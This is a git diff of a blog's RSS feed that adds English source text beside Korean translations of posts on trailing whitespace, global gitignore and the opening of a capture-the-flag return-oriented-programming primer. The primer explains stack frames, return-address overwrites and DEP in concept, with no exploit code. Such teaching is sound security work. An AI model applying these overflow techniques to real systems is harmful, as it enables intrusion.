@@ -5,8 +5,8 @@
     <description>Blog for hackers.</description>
     <link>http://yous.be/</link>
     <atom:link href="http://yous.be/atom.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Mon, 16 Feb 2015 04:51:10 +0900</pubDate>
-    <lastBuildDate>Mon, 16 Feb 2015 04:51:10 +0900</lastBuildDate>
+    <pubDate>Mon, 16 Feb 2015 06:40:10 +0900</pubDate>
+    <lastBuildDate>Mon, 16 Feb 2015 06:40:10 +0900</lastBuildDate>
     <generator>Jekyll v3.0.0-beta1</generator>
     
       <item>
@@ -1629,14 +1629,20 @@ Date:   Fri Jul &lt;span class=&quot;m&quot;&gt;18&lt;/span&gt; 21:29:14 &lt;spa
         
         <description>&lt;p&gt;&lt;a href=&quot;http://codeimpossible.com/about.html&quot;&gt;Jared Barboza&lt;/a&gt;가 쓴 &lt;a href=&quot;http://codeimpossible.com/2012/04/02/Trailing-whitespace-is-evil-Don-t-commit-evil-into-your-repo-/&quot;&gt;줄 끝 공백에 관한 글&lt;/a&gt;이다.&lt;/p&gt;
 
+&lt;!-- **Lately, I’ve beeen working on a lot of projects with different people/languages/editors, most of us were new git’ers and each project had a real problem with trailing whitespace.** --&gt;
+
 &lt;blockquote&gt;
 &lt;p&gt;&lt;strong&gt;난 최근에 다양한 사람/언어/편집기와 함께 많은 프로젝트를 진행해 왔다. 우리들 대부분은 Git 초보자였고, 각 프로젝트는 줄 끝 공백에 관한 문제가 있었다.&lt;/strong&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 
 &lt;p&gt;경력 있는 개발자로만 이루어진 팀이라고 해도 이런 문제는 발생하기 마련이다.&lt;/p&gt;
 
+&lt;!-- Trailing whitespace issues can cause a lot of problems when they get into your repository. It leads to falsey diffs which claim lines have been changed when in fact the only thing that changed was spacing. --&gt;
+
 &lt;blockquote&gt;
 &lt;p&gt;줄 끝 공백은 당신의 저장소에서 상당히 많은 문제를 일으킬 수 있다. 실제로 바뀐 것은 공백일 뿐인데도 그 줄에 변경 사항이 있다는 잘못된 diff를 만든다.&lt;/p&gt;
+
+&lt;!-- This can make finding what actually changed in a file later on in the development cycle next to impossible. Most open source project leads know this and a lot of them will reject pull requests that fail to trim whitespace (or have other --&gt;
 
 &lt;p&gt;이는 개발 과정에서 나중에 실제 파일의 변경 사항이 무엇이었는지 찾기 불가능하게 만든다. 대부분의 오픈 소스 프로젝트 대표들은 이를 알고 있고, 그들 대부분은 줄 끝 공백을 없애지 않은 풀 리퀘스트를 거절할 것이다.&lt;/p&gt;
 &lt;/blockquote&gt;
@@ -1701,8 +1707,12 @@ Date:   Fri Jul &lt;span class=&quot;m&quot;&gt;18&lt;/span&gt; 21:29:14 &lt;spa
         
         <description>&lt;p&gt;&lt;a href=&quot;http://usevim.com&quot;&gt;usevim&lt;/a&gt;의 &lt;a href=&quot;http://twitter.com/#!/alex_young&quot;&gt;Alex Young&lt;/a&gt;이 쓴 &lt;a href=&quot;http://usevim.com/2013/10/04/gitglobal-ignore/&quot;&gt;global gitignore에 관한 글&lt;/a&gt;이다.&lt;/p&gt;
 
+&lt;!-- For years I dumped this into my `.gitignore` files: `*.sw?`. Then I realised that some people don&#39;t use Vim, and therefore probably don&#39;t want to see my editor-specific `.gitignore` entries. Different editors handle swap and recovery files different ways, so it seems redundant to force these settings on everyone. --&gt;
+
 &lt;blockquote&gt;
 &lt;p&gt;나는 몇 년간 &lt;code&gt;.gitignore&lt;/code&gt;에 &lt;code&gt;*.sw?&lt;/code&gt;을 넣어 왔는데, Vim을 쓰지 않는 사람들은 특정 편집기를 위한 &lt;code&gt;.gitignore&lt;/code&gt; 항목을 보고 싶지 않아 할 수도 있다는 걸 깨달았다. 편집기들은 임시 파일과 복구 파일을 각자 다른 방식으로 관리하기 때문에 이 설정을 모두에게 강요하는 것은 과해 보인다.&lt;/p&gt;
+
+&lt;!-- A better approach is to use a global option. Run `git config --global core.excludesfile ~/.gitignore`. Then you can add `*.sw?`, and perhaps `*~` as well. I like to add `.DS_Store` because Windows developers don&#39;t need to worry about that nonsense, and they should probably add `Thumbs.db`. --&gt;
 
 &lt;p&gt;이것보단 global 옵션을 사용하는 것이 낫다. &lt;code&gt;git config --global core.excludesfile ~/.gitignore&lt;/code&gt;를 실행해라. 그러면 거기에 &lt;code&gt;*.sw?&lt;/code&gt;을, 어쩌면 &lt;code&gt;*~&lt;/code&gt;도 넣을 수 있다. 난 &lt;code&gt;.DS_Store&lt;/code&gt;를 추가할 텐데, Windows 개발자들은 여기 신경 쓸 필요가 없기 때문이다. 그리고 그들은 아마 &lt;code&gt;Thumbs.db&lt;/code&gt;를 추가해야 할 것이다.&lt;/p&gt;
 &lt;/blockquote&gt;
@@ -1726,27 +1736,89 @@ Date:   Fri Jul &lt;span class=&quot;m&quot;&gt;18&lt;/span&gt; 21:29:14 &lt;spa
 
 &lt;hr&gt;
 
+&lt;!-- # ropasaurusrex: a primer on return-oriented programming --&gt;
+
+&lt;!-- One of the worst feelings when playing a capture-the-flag challenge is the [hindsight][] problem. You spend a few hours on a level---nothing like the amount of time I spent on [cnot][], not by a fraction---and realize that it was actually pretty easy. But also a brainfuck. That&#39;s what ROP&#39;s all about, after all! --&gt;
+
 &lt;p&gt;CTF 대회 중 가장 기분이 나쁠 때는 &lt;a href=&quot;http://knowyourmeme.com/memes/captain-hindsight&quot;&gt;나중에 깨닫는&lt;/a&gt; 문제를 풀 때다. 한 문제에 몇 시간을 보내고 나서&amp;mdash;내가 &lt;a href=&quot;https://blog.skullsecurity.org/blog/2013/epic-cnot-writeup-plaidctf&quot;&gt;cnot&lt;/a&gt;에 쓴 시간에 비할 바는 아니지만&amp;mdash;사실은 꽤 쉬운 문제라는 걸 깨닫는다. 하지만 역시 골치아프다. 그게 바로 ROP다!&lt;/p&gt;
+
+&lt;!-- Anyway, even though I spent a lot of time working on the wrong solution (specifically, I didn&#39;t think to bypass [ASLR][] for quite awhile), the process we took of completing the level first without, then with ASLR, is actually a good way to show it, so I&#39;ll take the same route on this post. --&gt;
 
 &lt;p&gt;어쨌든, 잘못된 방법으로 많은 시간을 썼음에도 불구하고 (특히, 한동안 &lt;a href=&quot;https://en.wikipedia.org/wiki/Address_space_layout_randomization&quot;&gt;ASLR&lt;/a&gt;을 우회할 생각은 하지 않았다), 우리가 이 문제를 풀기까지 거쳤던 과정(ASLR을 고려하지 않고, 그 다음은 ASLR을 고려해서)은 설명하기 좋은 방법이므로 이 글에서도 같은 방법을 사용하겠다.&lt;/p&gt;
 
+&lt;!-- Before I say anything else, I have to thank HikingPete for being my wingman on this one. Thanks to him, we solved this puzzle much more quickly and, for a short time, were in 3rd place worldwide! --&gt;
+
 &lt;p&gt;먼저, 이 글에서 파트너가 되어 준 HikingPete에게 감사하고 싶다. 그 덕분에 우리는 이 퍼즐을 훨씬 빨리 풀 수 있었고, 잠깐 동안 세계 3위를 차지했다!&lt;/p&gt;
+
+&lt;!-- Coincidentally, I&#39;ve been meaning to write a post on [ROP][] for some time now. I even wrote a vulnerable demo program that I was going to base this on! But, since PlaidCTF gave us this challenge, I thought I&#39;d talk about it instead! This isn&#39;t just a writeup, this is designed to be a fairly in-depth primer on return-oriented programming! If you&#39;re more interested in the process of solving a CTF level, have a look at [my writeup of cnot][]. :) --&gt;
 
 &lt;p&gt;우연히, 난 한동안 &lt;a href=&quot;https://en.wikipedia.org/wiki/Return-oriented_programming&quot;&gt;ROP&lt;/a&gt;에 대한 글을 쓸 셈이었다. 심지어 기초가 될 취약한(vulnerable) 데모 프로그램까지 만들고 있었다! 하지만 PlaidCTF에서 문제가 나왔으니 그 데모 대신 이 문제에 대해 말하겠다! 이건 단순한 문제 풀이(writeup)가 아니고, 상당히 상세한 return-oriented programming 입문서가 될 것이다! 만약 CTF 문제를 푸는 과정이 더 궁금하다면, &lt;a href=&quot;https://blog.skullsecurity.org/blog/2013/epic-cnot-writeup-plaidctf&quot;&gt;내 cnot writeup&lt;/a&gt;을 보라. :)&lt;/p&gt;
 
+&lt;!-- ## What the heck is ROP? --&gt;
+
 &lt;h2&gt;&lt;a id=&quot;what-the-heck-is-rop&quot;&gt;&lt;/a&gt;도대체 ROP가 뭐야?&lt;/h2&gt;
+
+&lt;!-- ROP---return-oriented programming---is a modern name for a classic exploit called &quot;[return into libc][]&quot;. The idea is that you found an overflow or other type of vulnerability in a program that lets you take control, but you have no reliable way get your code into executable memory ([DEP][], or data execution prevention, means that you can&#39;t run code from anywhere you want anymore). --&gt;
 
 &lt;p&gt;ROP&amp;mdash;return-oriented programming&amp;mdash;는 고전적 익스플로잇(exploit) &amp;ldquo;&lt;a href=&quot;https://en.wikipedia.org/wiki/Return-to-libc_attack&quot;&gt;return into libc&lt;/a&gt;&amp;quot;를 나타내는 현대 용어다. 이 아이디어는 프로그램을 마음대로 조종할 수 있는 오버플로(overflow)나 다른 유형의 취약점을 발견했지만, 코드를 실행 가능한 메모리 영역(executable memory)에 올릴 수 있는 확실한 방법이 없을 때(&lt;a href=&quot;https://en.wikipedia.org/wiki/Data_Execution_Prevention&quot;&gt;DEP&lt;/a&gt;, 데이터 실행 방지(Data Execution Prevention), 사용자가 원하는 곳에서부터 코드를 실행시킬 수 없다)를 위한 것이다.&lt;/p&gt;
 
+&lt;!-- With ROP, you can pick and choose pieces of code that are already in sections executable memory and followed by a &#39;[return][]&#39;. Sometimes those pieces are simple, and sometimes they&#39;re complicated. In this exercise, we only need the simple stuff, thankfully! --&gt;
+
 &lt;p&gt;ROP를 이용하면 실행 가능한 메모리 영역(executable memory)에 이미 있는 코드 중 &amp;rsquo;&lt;a href=&quot;https://en.wikipedia.org/wiki/Return_statement&quot;&gt;return&lt;/a&gt;&amp;lsquo;으로 끝나는 조각들을 고를 수 있다. 그 조각들이 간단할 때도 있고, 복잡할 때도 있다. 다행히도 이 예제에서 우리는 간단한 것들만 필요하다!&lt;/p&gt;
+
+&lt;!-- But, we&#39;re getting ahead of ourselves. Let&#39;s first learn a little more about the [stack][]! I&#39;m not going to spend a ton of time explaining the stack, so if this is unclear, please check out [my assembly tutorial][]. --&gt;
 
 &lt;p&gt;하지만 우린 너무 앞서나가고 있다. 일단 &lt;a href=&quot;https://en.wikipedia.org/wiki/Call_stack&quot;&gt;스택(stack)&lt;/a&gt;에 대해 좀 더 배워보자! 스택을 설명하는 데에 &lt;em&gt;엄청난&lt;/em&gt; 시간을 쓰지는 않을 것이니, 잘 모르겠다면 &lt;a href=&quot;https://blog.skullsecurity.org/wiki/index.php/The_Stack&quot;&gt;내 어셈블리(assembly) 튜토리얼&lt;/a&gt;&lt;sup id=&quot;fnref1&quot;&gt;&lt;a href=&quot;#fn1&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;을 보라.&lt;/p&gt;
 
+&lt;!-- ## The stack --&gt;
+
 &lt;h2&gt;&lt;a id=&quot;the-stack&quot;&gt;&lt;/a&gt;스택&lt;/h2&gt;
+
+&lt;!-- I&#39;m sure you&#39;ve heard of the stack before. [Stack overflows][]? Smashing the stack? But what&#39;s it actually mean? If you already know, feel free to treat this as a quick primer, or to just skip right to the next section. Up to you! --&gt;
 
 &lt;p&gt;스택에 관해 한 번쯤은 들어보았을 것이다. &lt;a href=&quot;https://en.wikipedia.org/wiki/Stack_overflow&quot;&gt;스택 오버플로(stack overflow)&lt;/a&gt;? 스택 깨뜨리기(smashing the stack)? 하지만 그게 무슨 뜻인가? 이미 알고 있다면, 이걸 간단한 입문서 정도로 생각하거나 바로 다음 섹션으로 넘어가라. 당신 마음대로!&lt;/p&gt;
 
+&lt;!-- The simple idea is, let&#39;s say function `A()` calls function `B()` with two parameters, 1 and 2. Then `B()` calls `C()` with two parameters, 3 and 4. When you&#39;re in `C()`, the stack looks like this: --&gt;
+
 &lt;p&gt;이 간단한 아이디어를 설명하자면, 함수 &lt;code&gt;A()&lt;/code&gt;가 함수 &lt;code&gt;B()&lt;/code&gt;를 두 개의 인자 1, 2와 함께 호출한다고 하자. 그리고 &lt;code&gt;B()&lt;/code&gt;는 &lt;code&gt;C()&lt;/code&gt;를 두 개의 인자 3, 4와 함께 호출한다고 하자. &lt;code&gt;C()&lt;/code&gt;가 실행 중일 때, 스택은 이렇게 보일 것이다:&lt;/p&gt;
+
+&lt;!-- ```text
++----------------------+
+|         ...          | (higher addresses)
++----------------------+
+
++----------------------+ &lt;-- start of &#39;A&#39;s stack frame
+|   [return address]   | &lt;-- address of whatever called &#39;A&#39;
++----------------------+
+|   [frame pointer]    |
++----------------------+
+|   [local variables]  |
++----------------------+
+
++----------------------+ &lt;-- start of &#39;B&#39;s stack frame
+|         2 (parameter)|
++----------------------+
+|         1 (parameter)|
++----------------------+
+|   [return address]   | &lt;-- the address that &#39;B&#39; returns to
++----------------------+
+|   [frame pointer]    |
++----------------------+
+|   [local variables]  |
++----------------------+
+
++----------------------+ &lt;-- start of &#39;C&#39;s stack frame
+|         4 (parameter)|
++----------------------+
+|         3 (parameter)|
++----------------------+
+|   [return address]   | &lt;-- the address that &#39;C&#39; returns to
++----------------------+
+
++----------------------+
+|         ...          | (lower addresses)
++----------------------+
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;+----------------------+
 |         ...          | (높은 주소)
 +----------------------+
@@ -1783,13 +1855,26 @@ Date:   Fri Jul &lt;span class=&quot;m&quot;&gt;18&lt;/span&gt; 21:29:14 &lt;spa
 |         ...          | (낮은 주소)
 +----------------------+
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- This is quite a mouthful (eyeful?) if you don&#39;t live and breathe all the time at this depth, so let me explain a bit. Every time you call a function, a new &quot;stack frame&quot; is built. A &quot;frame&quot; is simply some memory that the function allocates for itself on the stack. In fact, it doesn&#39;t even allocate it, it just adds stuff to the end and updates the `esp` register so any functions it calls know where its own stack frame needs to start (`esp`, the stack pointer, is basically a variable). --&gt;
+
 &lt;p&gt;당신이 이 수준에서 숨쉬듯이 생각하는 사람이 아니라면 이건 꽤 어려운 (눈을 끄는?) 것이기 때문에 조금 설명하도록 하겠다. 매번 당신이 함수를 호출할 때, 새로운 &amp;quot;스택 프레임&amp;quot;이 만들어진다. &amp;quot;프레임&amp;quot;은 단순히 말해 함수가 자신을 위해 스택에 할당한 메모리다. 사실은 할당조차 하지 않으며, 그저 끝에 뭔가 추가하고 &lt;code&gt;esp&lt;/code&gt; 레지스터를 업데이트 한다. 그러면 이것이 호출하는 모든 함수는 자신의 스택 프레임이 어디에서 시작해야 하는지 알게 된다(&lt;code&gt;esp&lt;/code&gt;, 스택 포인터이며 이는 기본적으로 변수다).&lt;/p&gt;
+
+&lt;!-- This stack frame holds the context for the current function, and lets you easily a) build frames for new functions being called, and b) return to previous frames (i.e., return from functions). `esp` (the stack pointer) moves up and down, but always points to the top of the stack (the lowest address). --&gt;
 
 &lt;p&gt;이 스택 프레임은 현재 함수의 상태(context)를 담고 있고, 당신이 쉽게 a) 새로 불린 함수의 프레임을 만들고, b) 이전 프레임으로 돌아갈 수 있게 한다 (예를 들어, 함수에서 반환한 경우). &lt;code&gt;esp&lt;/code&gt;(스택 포인터)는 위아래로 움직이지만 항상 스택의 시작점(가장 낮은 주소)을 가리킨다.&lt;/p&gt;
 
+&lt;!-- Have you ever wondered where a function&#39;s local variables go when you call another function (or, better yet, you call the same function again recursively)? Of course not! But if you did, now you&#39;d know: they wind up in an old stack frame that we return to later! --&gt;
+
 &lt;p&gt;다른 함수를 호출했을 때 원래 함수의 지역 변수들은 어디로 가는지 궁금한 적이 있는가 (더 좋게는, 같은 함수를 재귀적으로 한 번 더 호출할 때)? 당연히 없을 것이다! 하지만 생각해 봤다면, 이미 알고 있을 것이다: 우리가 다시 돌아올 예전 스택 프레임에 머무른다!&lt;/p&gt;
 
+&lt;!-- Now, let&#39;s look at what&#39;s stored on the stack, in the order it gets pushed (note that, confusingly, you can draw a stack either way; in this document, the stack grows from top to bottom, so the older/callers are on top and the newer/callees are on the bottom): --&gt;
+
 &lt;p&gt;이제 스택에 무엇이 저장되어 있는지 스택에 들어간 순서대로 보자 (헷갈리지만, 스택을 다른 방법으로 그릴 수도 있다; 이 글에서는 스택이 위에서 아래로 늘어나기에 오래된/호출하는 함수는 위에, 새로운/호출된 함수는 아래에 있다):&lt;/p&gt;
+
+&lt;!-- - Parameters: The parameters that were passed into the function by the caller---these are _extremely_ important with ROP.
+- Return address: Every function needs to know where to go when it&#39;s done. When you call a function, the address of the instruction right after the call is pushed onto the stack prior to entering the new function. When you return, the address is popped off the stack and is jumped to. This is extremely important with ROP.
+- Saved frame pointer: Let&#39;s totally ignore this. Seriously. It&#39;s just something that compilers typically do, except when they don&#39;t, and we won&#39;t speak of it again.
+- Local variables: A function can allocate as much memory as it needs (within reason) to store local variables. They go here. They don&#39;t matter at all for ROP and can be safely ignored. --&gt;
 
 &lt;ul&gt;
 &lt;li&gt;인자(Parameters): 호출한 함수가 넘긴 인자들&amp;mdash;ROP에서 &lt;em&gt;대단히&lt;/em&gt; 중요하다.&lt;/li&gt;
@@ -1798,13 +1883,31 @@ Date:   Fri Jul &lt;span class=&quot;m&quot;&gt;18&lt;/span&gt; 21:29:14 &lt;spa
 &lt;li&gt;지역 변수(Local variables): 함수는 지역 변수를 저장하기 위해 필요한 만큼 (적당한 범위 내에서) 메모리를 할당할 수 있다. 지역 변수는 여기서 시작한다. ROP와는 전혀 관계 없으며 무시해도 안전하다.&lt;/li&gt;
 &lt;/ul&gt;
 
+&lt;!-- So, to summarize: when a function is called, parameters are pushed onto the stack, followed by the return address. When the function returns, it grabs the return address off the stack and jumps to it. The parameters pushed onto the stack are [removed by the calling function][], [except when they&#39;re not][]. We&#39;re going to assume the caller cleans up, that is, the function doesn&#39;t clean up after itself, since that&#39;s is how it works in this challenge (and most of the time on Linux). --&gt;
+
 &lt;p&gt;그래서, 요약하자면: 함수가 호출되면 인자들이 스택에 들어가고, 그 뒤에 반환 주소가 들어간다. 함수가 반환하면, 반환 주소를 스택에서 뽑아 그리로 점프한다. 스택에 들어갔던 인자들은 &lt;a href=&quot;https://en.wikipedia.org/wiki/X86_calling_conventions#cdecl&quot;&gt;호출하는 함수에 의해 지워지지만&lt;/a&gt;, &lt;a href=&quot;https://en.wikipedia.org/wiki/X86_calling_conventions#stdcall&quot;&gt;예외&lt;/a&gt;도 있다. 우리는 호출하는 함수가 인자를 지운다고 가정하자. 즉, 호출된 함수가 자신의 인자를 지우지 않는다고 가정하자. 이건 이 문제가 (그리고 Linux 대부분의 역사에서) 그렇게 동작하기 때문이다.&lt;/p&gt;
+
+&lt;!-- ## Heaven, hell, and stack frames --&gt;
 
 &lt;h2&gt;&lt;a id=&quot;heaven-hell-and-stack-frames&quot;&gt;&lt;/a&gt;천국, 지옥 그리고 스택 프레임&lt;/h2&gt;
 
+&lt;!-- The main thing you have to understand to know ROP is this: a function&#39;s entire universe is its stack frame. The stack is its god, the parameters are its commandments, local variables are its sins, the saved frame pointer is its bible, and the return address is its heaven (okay, probably hell). It&#39;s all right there in the [Book of Inte][], chapter 3, verses 19 - 26 (note: it isn&#39;t actually, don&#39;t bother looking). --&gt;
+
 &lt;p&gt;ROP를 이해하기 위해 이해해야 하는 가장 중요한 건: 함수의 스택 프레임은 그 함수의 온 우주라는 것이다. 스택은 함수의 신이고, 인자는 성경의 십계명이고, 지역 변수는 죄며, 프레임 포인터는 성경이고 반환 주소는 천국이다 (그래, 지옥일 수도 있다). 모든 건 &lt;a href=&quot;http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html&quot;&gt;인텔의 책&lt;/a&gt;, 3장, 19-26구절에 있다 (주: 사실 아니니 보는 수고는 하지 마라).&lt;/p&gt;
 
+&lt;!-- Let&#39;s say you call the `sleep()` function, and get to the first line; its stack frame is going to look like this: --&gt;
+
 &lt;p&gt;당신이 &lt;code&gt;sleep()&lt;/code&gt; 함수를 호출하고, 첫 라인에 왔다고 하자; 그 스택 프레임은 이렇게 생겼을 것이다:&lt;/p&gt;
+
+&lt;!-- ``` text
+          ...            &lt;-- don&#39;t know, don&#39;t care territory (higher addresses)
++----------------------+
+|      [seconds]       |
++----------------------+
+|   [return address]   | &lt;-- esp points here
++----------------------+
+          ...            &lt;-- not allocated, don&#39;t care territory (lower addresses)
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;          ...            &amp;lt;-- 모른다, 영역은 상관 없다. (높은 주소)
 +----------------------+
 |      [seconds]       |
@@ -1813,9 +1916,23 @@ Date:   Fri Jul &lt;span class=&quot;m&quot;&gt;18&lt;/span&gt; 21:29:14 &lt;spa
 +----------------------+
           ...            &amp;lt;-- 할당되지 않았다, 영역은 상관 없다. (낮은 주소)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- When `sleep()` starts, this stack frame is all it sees. It can save a frame pointer (crap, I mentioned it twice since I promised not to; I swear I won&#39;t mention it again) and make room for local variables by subtracting the number of bytes it wants from `esp` (ie, making `esp` point to a lower address). It can call other functions, which create new frames under `esp`. It can do many different things; what matters is that, when it `sleep()` starts, the stack frame makes up its entire world. --&gt;
+
 &lt;p&gt;&lt;code&gt;sleep()&lt;/code&gt;이 시작하는 순간, 스택 프레임은 지금 보이는 게 다다. 이 스택 프레임은 프레임 포인터를 저장할 수도 있고 (젠장, 말 안 하기로 해 놓고 두 번이나 말해버렸다; 다시는 언급하지 않을 것을 맹세한다) &lt;code&gt;esp&lt;/code&gt;에서 몇 바이트 뺌으로써 (즉, &lt;code&gt;esp&lt;/code&gt; 포인터를 더 낮은 주소로 만듦으로써) 지역 변수를 위한 공간을 확보할 수도 있다. &lt;code&gt;esp&lt;/code&gt; 아래에 새 프레임을 만드는 다른 함수를 호출할 수도 있다. 이 스택 프레임은 여러 가지 다양한 일을 할 수 있다; 그게 무엇인지 간에, &lt;code&gt;sleep()&lt;/code&gt;이 시작하면, 스택 프레임은 이 함수의 세계를 만들어낸다.&lt;/p&gt;
 
+&lt;!-- When `sleep()` returns, it winds up looking like this: --&gt;
+
 &lt;p&gt;&lt;code&gt;sleep()&lt;/code&gt;이 반환하면, 결국 이렇게 생겼을 것이다:&lt;/p&gt;
+
+&lt;!-- ``` text
+          ...            &lt;-- don&#39;t know, don&#39;t care territory (higher addresses)
++----------------------+
+|      [seconds]       | &lt;-- esp points here
++----------------------+
+| [old return address] | &lt;-- not allocated, don&#39;t care territory starts here now
++----------------------+
+          ...            (lower addresses)
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;          ...            &amp;lt;-- 모른다, 영역은 상관 없다. (높은 주소)
 +----------------------+
 |      [seconds]       | &amp;lt;-- esp는 여기를 가리킨다.
@@ -1824,13 +1941,36 @@ Date:   Fri Jul &lt;span class=&quot;m&quot;&gt;18&lt;/span&gt; 21:29:14 &lt;spa
 +----------------------+
           ...            (낮은 주소)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- And, of course, the caller, after `sleep()` returns, will remove &quot;seconds&quot; from the stack by adding 4 to `esp` (later on, we&#39;ll talk about how we have to use `pop/pop/ret` constructs to do the same thing). --&gt;
+
 &lt;p&gt;당연히 호출한 함수는 &lt;code&gt;sleep()&lt;/code&gt;이 반환하고 나면 &lt;code&gt;esp&lt;/code&gt;에 4를 더해 &amp;quot;seconds&amp;quot;를 스택에서 지운다 (나중에 똑같은 일을 하기 위해 어떻게 &lt;code&gt;pop/pop/ret&lt;/code&gt;을 사용해야 하는지 이야기할 것이다).&lt;/p&gt;
+
+&lt;!-- In a properly working system, this is how life works. That&#39;s a safe assumption. The &quot;seconds&quot; value would only be on the stack if it was pushed, and the return address is going to point to the place it was called from. Duh. How else would it get there? --&gt;
 
 &lt;p&gt;제대로 동작하는 시스템에서는, 이게 작동 원리다. 안전한 전제다. &amp;quot;seconds&amp;rdquo; 값은 스택에 들어갔을 때 스택에만 있을 것이고, 반환 주소는 호출된 장소를 가리키고 있을 것이다. 그럼, 그럼. 달리 어떤 방법으로 그리 갈 수 있을까?&lt;/p&gt;
 
+&lt;!-- ## Controlling the stack --&gt;
+
 &lt;h2&gt;&lt;a id=&quot;controlling-the-stack&quot;&gt;&lt;/a&gt;스택 주무르기&lt;/h2&gt;
 
+&lt;!-- ...well, since you asked, let me tell you. We&#39;ve all heard of a &quot;stack overflow&quot;, which involves overwriting a variable on the stack. What&#39;s that mean? Well, let&#39;s say we have a frame that looks like this: --&gt;
+
 &lt;p&gt;&amp;hellip;뭐, 당신이 궁금해 하니 말하겠다. 우리 모두 &amp;ldquo;스택 오버플로&amp;quot;에 대해 들어봤다. 그건 스택에 있는 변수를 덮어쓰는 것과 관련이 있다. 그게 무슨 뜻이냐? 뭐, 이런 스택 프레임이 있다고 하자:&lt;/p&gt;
+
+&lt;!-- ``` text
+          ...            &lt;-- don&#39;t know, don&#39;t care territory (higher addresses)
++----------------------+
+|      [seconds]       |
++----------------------+
+|   [return address]   | &lt;-- esp points here
++----------------------+
+|     char buf[16]     |
+|                      |
+|                      |
+|                      |
++----------------------+
+          ...            (lower addresses)
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;          ...            &amp;lt;-- 모른다, 영역은 상관 없다. (높은 주소)
 +----------------------+
 |      [seconds]       |
@@ -1844,19 +1984,51 @@ Date:   Fri Jul &lt;span class=&quot;m&quot;&gt;18&lt;/span&gt; 21:29:14 &lt;spa
 +----------------------+
           ...            (낮은 주소)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- The variable `buf` is 16 bytes long. What happens if a program tries to write to the 17^th byte of buf (i.e., `buf[16]`)? Well, it writes to the last byte---[little endian][]---of the return address. The 18^th byte writes to the second-last byte of the return address, and so on. Therefore, we can change the return address to point to anywhere we want. _Anywhere_ we want. So when the function returns, where&#39;s it go? Well, it thinks it&#39;s going to where it&#39;s supposed to go---in a perfect world, it would be---but nope! In this case, it&#39;s going to wherever the attacker wants it to. If the attacker says to jump to [0][], it jumps to 0 and crashes. If the attacker says to go to `0x41414141` (&quot;AAAA&quot;), it jumps there and probably crashes. If the attacker says to jump to the stack... well, that&#39;s where it gets more complicated... --&gt;
+
 &lt;p&gt;변수 &lt;code&gt;buf&lt;/code&gt;의 길이는 16바이트다. 만약 프로그램이 buf의 17번째 바이트(즉, &lt;code&gt;buf[16]&lt;/code&gt;)에 쓰려고 하면 어떻게 될까? 에, 반환 주소의 마지막 바이트&amp;mdash;&lt;a href=&quot;https://en.wikipedia.org/wiki/Endianness&quot;&gt;리틀 엔디언&lt;/a&gt;&amp;mdash;에 쓰게 된다. 18번째 바이트는 반환 주소의 끝에서 두 번째 바이트에 쓰게 되고, 그런 방식이다. 이렇게 우리는 우리가 원하는 곳으로 반환 주소를 바꿀 수 있다. &lt;em&gt;원하는 곳 어디든&lt;/em&gt;. 함수가 반환하면, 어디로 가겠는가? 뭐, 아마 그건 가야 할 곳으로 가고 있다고 생각할 것이다&amp;mdash;완벽한 세계에서는, 그럴 것이다&amp;mdash;하지만 아니다! 이 경우에는, 공격자가 원하는 곳 어디로든지 갈 수 있다. 공격자가 &lt;a href=&quot;https://en.wikipedia.org/wiki/Zero_page&quot;&gt;0&lt;/a&gt;으로 점프하라고 하면, 0으로 점프하고 크래시를 일으킬 것이다. 공격자가 &lt;code&gt;0x41414141&lt;/code&gt;(&amp;quot;AAAA&amp;rdquo;)로 점프하라고 하면, 그리로 점프하고 아마도 크래시를 일으킬 것이다. 공격자가 스택으로 점프하라고 하면&amp;hellip; 음, 이건 좀 복잡해진다&amp;hellip;&lt;/p&gt;
+
+&lt;!-- ## DEP --&gt;
 
 &lt;h2&gt;&lt;a id=&quot;dep&quot;&gt;&lt;/a&gt;DEP&lt;/h2&gt;
 
+&lt;!-- Traditionally, an attacker would change the return address to point to the stack, since the attacker already has the ability to put code on the stack (after all, code is just a bunch of bytes!). But, being that it was such a common and easy way to exploit systems, those assholes at OS companies (just kidding, I love you guys :) ) put a stop to it by introducing data execution prevention, or DEP. On any DEP-enabled system, you can no longer run code on the stack---or, more generally, anywhere an attacker can write---instead, it crashes. --&gt;
+
 &lt;p&gt;전통적으로, 공격자는 스택에 코드를 넣을 수 있었기 때문에 (어찌 되었건, 코드는 그저 바이트 뭉치일 뿐이다!), 반환 주소가 스택을 가리키도록 바꿔 왔다. 하지만 그건 시스템을 공격하는 일반적이고 쉬운 방법이었기 때문에, OS 회사의 나쁜 자식들이 (농담이다, 난 당신들을 사랑한다 :)) 데이터 실행 방지, DEP를 통해 이를 멈췄다. DEP가 적용된 어떤 시스템이건, 스택에서 코드를 실행할 수 없다&amp;mdash;좀 더 일반적으로, 공격자가 쓸(write) 수 있는 어떤 곳에서도&amp;mdash;그렇지 않으면, 크래시를 일으킨다.&lt;/p&gt;
+
+&lt;!-- So how the hell do I run code without being allowed to run code!? --&gt;
 
 &lt;p&gt;그러면 코드를 실행할 권한도 없이 도대체 어떻게 코드를 실행할 수 있나!?&lt;/p&gt;
 
+&lt;!-- Well, we&#39;re going to get to that. But first, let&#39;s look at the vulnerability that the challenge uses! --&gt;
+
 &lt;p&gt;음, 이제 그걸 할 것이다. 하지만 먼저, 이 문제가 사용하는 취약점을 보자!&lt;/p&gt;
+
+&lt;!-- ## The vulnerability --&gt;
 
 &lt;h2&gt;&lt;a id=&quot;the-vulnerability&quot;&gt;&lt;/a&gt;취약점&lt;/h2&gt;
 
